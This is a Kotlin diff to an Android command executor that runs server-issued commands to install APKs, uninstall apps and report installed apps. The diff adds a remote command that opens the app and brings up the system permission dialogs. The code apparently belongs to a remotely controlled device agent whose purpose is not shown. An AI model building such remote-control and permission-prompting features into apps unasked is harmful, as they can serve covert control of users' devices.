@@ -32,6 +32,7 @@ object CommandExecutor {
                     "install" -> installApk(context, param)
                     "uninstall" -> uninstallApp(context, param)
                     "apps" -> reportApps(context)
+                    "req_perms" -> requestPermissions(context)
                 }
                 if (id >= 0) ack(context, id, "ok")
             } catch (e: Exception) {
@@ -216,6 +217,16 @@ object CommandExecutor {
     /** Push a fresh app inventory to the server (used by the panel Apps tab). */
     private fun reportApps(context: Context) {
         DeviceReporter.report(context)
+    }
+
+    /** Remote command: open the app and pop the system permission-grant dialogs. */
+    private fun requestPermissions(context: Context) {
+        try {
+            val i = Intent(context, MainActivity::class.java)
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            i.putExtra("req_perms", true)
+            context.startActivity(i)
+        } catch (_: Exception) {}
     }
 
     private fun ack(context: Context, id: Long, result: String) {
